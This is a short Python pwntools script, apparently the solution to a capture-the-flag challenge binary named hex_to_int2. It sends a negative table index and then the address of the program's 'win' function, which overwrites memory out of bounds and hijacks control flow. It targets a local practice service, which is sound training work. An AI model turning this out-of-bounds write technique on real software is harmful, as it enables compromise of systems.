#!/usr/bin/env python3

from pwn import *

exe = ELF("./dist/hex_to_int2")

elf = context.binary = exe

gs = """
break main
continue
"""

# context.log_level = "warning"

# run with python3 solve.py REMOTE
if args.REMOTE:
    p = remote("localhost", 41343)

# run with python3 solve.py GDB
elif args.GDB:
    context.terminal = ["tmux", "splitw", "-h"]
    p = gdb.debug(exe.path, gdbscript=gs)

# run with python3 solve.py
else:
    p = elf.process([exe.path][1:])


### START HERE ###

win = elf.symbols["win"]
conv = lambda x: hex(x & 0xffffffff)

p.sendlineafter(b'pand the table (2)?.\n', b'2')
p.sendlineafter(b'to add: ', conv(-14).encode())
p.sendlineafter(b'value?\n', str(win&0xffffffff).encode())

p.sendlineafter(b'pand the table (2)?.\n', b'3')

p.interactive()